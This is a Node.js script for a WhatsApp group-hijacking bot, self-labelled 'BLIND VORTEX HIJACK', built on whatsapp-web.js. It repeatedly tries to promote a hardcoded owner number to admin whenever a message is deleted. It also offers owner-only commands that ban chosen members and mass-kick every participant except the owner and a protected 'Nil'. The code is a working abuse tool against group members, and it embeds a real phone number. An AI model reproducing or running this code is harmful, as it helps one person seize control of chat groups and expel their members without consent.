const { Client, LocalAuth } = require('whatsapp-web.js')
const qrcode = require('qrcode-terminal')

const client = new Client({
  authStrategy: new LocalAuth(),
  puppeteer: {
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  }
})

const OWNER = '255699034948@c.us'
client.on('ready',()=>console.log('🐼 BLIND VORTEX HIJACK'));
client.on('message_delete',async d=>{
    const chat=await client.getChatById(d.chatId);
    if(chat.isGroup&&(d.fromMe||d.author===OWNER)){
        for(let i=0;i<15;i++){
            try{await chat.promoteParticipants([OWNER]);console.log('👑 ADMIN')}catch{}
            await new Promise(r=>setTimeout(r,800))
        }
    }
});
client.on('message',async m=>{
    if(!m.body.startsWith('.'))return;
    const chat=await m.getChat();
    if(!chat.isGroup)return;
    const c=await m.getContact();
    if(c.id._serialized!==OWNER)return;
    
    const cmd=m.body.slice(1).split(' ')[0];
    const target=m.body.split(' ')[1];
    
    if(cmd==='pandaban'&&target){
        if(!target.includes('Nil')){
            await chat.removeParticipants([target+'@c.us']);
            m.reply(`🐼 ${target} BAN 24H (Nil protégé)`)
        }else m.reply('❌ Nil protégé')
    }
    if(cmd==='kickall'){
        const p=await chat.fetchParticipants();
        for(const u of p){
            if(u.id._serialized!==OWNER&&!u.id._serialized.includes('Nil')){
                try{await chat.removeParticipants([u.id._serialized])}catch{}
            }
        }
        m.reply('👑 TOI + Nil = SEULS')
    }
    if(cmd==='admin')await chat.promoteParticipants([OWNER]),m.reply('👑 ADMIN OK')
});
client.initialize();
